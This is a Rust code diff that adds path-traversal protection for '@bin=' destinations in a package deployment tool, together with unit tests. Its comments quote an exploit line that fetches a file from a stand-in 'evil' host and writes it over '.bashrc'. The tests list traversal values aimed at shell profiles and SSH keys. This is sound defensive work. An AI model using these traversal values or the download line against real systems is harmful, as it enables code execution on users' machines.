@@ -1,7 +1,7 @@
 use crate::core::{Error, Result};
 use std::fs;
 use std::io::Write;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use tempfile::NamedTempFile;
 
 pub fn atomic_write(path: &Path, content: &str) -> Result<()> {
@@ -60,8 +60,62 @@ pub fn force_remove(path: &Path) -> Result<()> {
     Ok(())
 }
 
+/// The path inside `bin_dir` that an `@bin=` value names, refused if it names anywhere else
+/// (SEC1).
+///
+/// `@bin=` is user text, and text a user pastes from somewhere else. Joined blindly,
+/// `@bin=../../.bashrc` resolves to a file in the home directory, and the deploy that follows
+/// replaces it with a symlink to a freshly downloaded, attacker-chosen file — one pasted line,
+/// code on the next shell start. **The traversal is in the destination, so HTTPS and a matching
+/// checksum do not touch it**: a fully verified download lands wherever `@bin` points.
+///
+/// A bin name is a filename. Anything with a separator in it, anywhere, is refused rather than
+/// normalised, because "what does `a/../b` mean" is a question with a different answer on every
+/// filesystem and none of them is worth being wrong about.
+///
+/// `confined` is the `[guard] confine_bin` key: off restores the unchecked join. The opening is
+/// the user's to make, and it is the whole file's worth of blast radius.
+pub fn bin_destination(bin_dir: &Path, name: &str, confined: bool) -> Result<PathBuf> {
+    let refuse = |why: &str| {
+        Err(Error::Validation(format!(
+            "refusing `@bin={}`: {}. It names a file inside {}, and nothing else — a value \
+             that escapes it would put a downloaded file wherever it pointed. Set \
+             `[guard] confine_bin = false` if you really mean it.",
+            name,
+            why,
+            bin_dir.display()
+        )))
+    };
+    if confined {
+        if name.is_empty() {
+            return refuse("it is empty");
+        }
+        if name.contains('/') || name.contains('\\') {
+            return refuse("it contains a path separator");
+        }
+        if name == "." || name == ".." {
+            return refuse("it is a directory, not a name");
+        }
+        if Path::new(name).is_absolute() {
+            return refuse("it is an absolute path");
+        }
+    }
+
+    let mut dest = bin_dir.join(name);
+    // The recorded path has to be the one that was written, extension and all, or the removal
+    // path looks for a file that was never there.
+    #[cfg(windows)]
+    if dest.extension().is_none() {
+        dest.set_extension("exe");
+    }
+    Ok(dest)
+}
+
 /// Put a downloaded artifact's executable on the user's PATH, refusing to destroy a file
 /// LiNix did not deploy.
+///
+/// `dest` must come from [`bin_destination`], which is what keeps an `@bin=` value from
+/// naming a file outside the bin directory (SEC1).
 ///
 /// `~/.local/bin` is shared with the user and with every other tool that installs there, so
 /// deploying by name alone means a package called `fd` silently replaces whatever `fd` the
@@ -157,6 +211,51 @@ pub async fn remove_deployed_path(path: impl AsRef<Path>) -> std::result::Result
         Ok(()) => Ok(()),
         Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
         Err(e) => Err(format!("{}: {}", path.display(), e)),
+    }
+}
+
+#[cfg(test)]
+mod bin_destination_tests {
+    use super::*;
+
+    fn dir() -> PathBuf {
+        PathBuf::from("/home/u/.local/bin")
+    }
+
+    #[test]
+    fn a_traversing_bin_name_is_refused() {
+        // SEC1's exploit, one pasted line: `web:http://evil/x @bin=../../.bashrc` resolved to
+        // the home directory and the deploy replaced the shell profile with a symlink to the
+        // downloaded file. HTTPS and a matching checksum do not touch this — the traversal is
+        // in the destination.
+        for bad in [
+            "../../.bashrc",
+            "../.ssh/authorized_keys",
+            r"..\..\x",
+            "sub/dir",
+            "..",
+            "",
+        ] {
+            assert!(
+                bin_destination(&dir(), bad, true).is_err(),
+                "`{}` must be refused",
+                bad
+            );
+        }
+    }
+
+    #[test]
+    fn a_plain_name_lands_in_the_bin_directory() {
+        let out = bin_destination(&dir(), "fd", true).unwrap();
+        assert_eq!(out.parent().unwrap(), dir());
+        assert!(out.file_name().unwrap().to_string_lossy().starts_with("fd"));
+    }
+
+    #[test]
+    fn the_guard_key_is_what_opens_it() {
+        // `[guard] confine_bin = false` restores the unchecked join. The opening is the
+        // user's to make, and this asserts it is still there to make.
+        assert!(bin_destination(&dir(), "../../.bashrc", false).is_ok());
     }
 }
 
